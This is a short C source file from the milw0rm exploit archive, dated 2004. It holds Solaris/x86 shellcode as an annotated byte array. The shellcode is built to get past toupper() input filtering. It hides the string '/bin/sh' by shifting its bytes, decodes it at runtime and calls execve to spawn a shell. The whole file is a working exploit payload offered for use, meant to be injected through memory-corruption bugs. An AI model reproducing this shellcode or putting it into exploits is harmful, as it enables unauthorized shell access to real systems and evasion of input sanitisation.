/*
 *  Solaris/x86
 *
 *  Used for toupper() evasion (look to the linux version for an
 *  explanation and usage example).
 */

char c0de[] =
/* main: */
"\xeb\x33"                                /* jmp callz                */
/* start: */
"\x5e"                                    /* popl %esi                */
"\x8d\x06"                                /* leal (%esi), %eax        */
"\x29\xc9"                                /* subl %ecx, %ecx          */
"\x89\xf3"                                /* movl %esi, %ebx          */
"\x89\x5e\x08"                            /* movl %ebx, 0x08(%esi)    */
"\xb1\x07"                                /* movb $0x07, %cl          */
/* loopz: */
"\x80\x03\x20"                            /* addb $0x20, (%ebx)       */
"\x43"                                    /* incl %ebx                */
"\xe0\xfa"                                /* loopne loopz             */
"\x93"                                    /* xchgl %eax, %ebx         */
"\x29\xc0"                                /* subl %eax, %eax          */
"\x89\x5e\x0b"                            /* movl %ebx, 0x0b(%esi)    */
"\x29\xd2"                                /* subl %edx, %edx          */
"\x88\x56\x19"                            /* movb %dl, 0x19(%esi)     */
"\x89\x56\x07"                            /* movl %edx, 0x07(%esi)    */
"\x89\x56\x0f"                            /* movl %edx, 0x0f(%esi)    */
"\x89\x56\x14"                            /* movl %edx, 0x14(%esi)    */
"\xb0\x3b"                                /* movb $0x3b, %al          */
"\x8d\x4e\x0b"                            /* leal 0x0b(%esi), %ecx    */
"\x89\xca"                                /* movl %ecx, %edx          */
"\x52"                                    /* pushl %edx               */
"\x51"                                    /* pushl %ecx               */
"\x53"                                    /* pushl %ebx               */
"\x50"                                    /* pushl %eax               */
"\xeb\x18"                                /* jmp lcall                */
/* callz: */
"\xe8\xc8\xff\xff\xff"                    /* call start               */

"\x0f\x42\x49\x4e\x0f\x53\x48"            /* /bin/sh -= 0x20          */
"\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"
/* lcall: */
"\x9a\x04\x04\x04\x04\x07\x04";

# milw0rm.com [2004-09-26]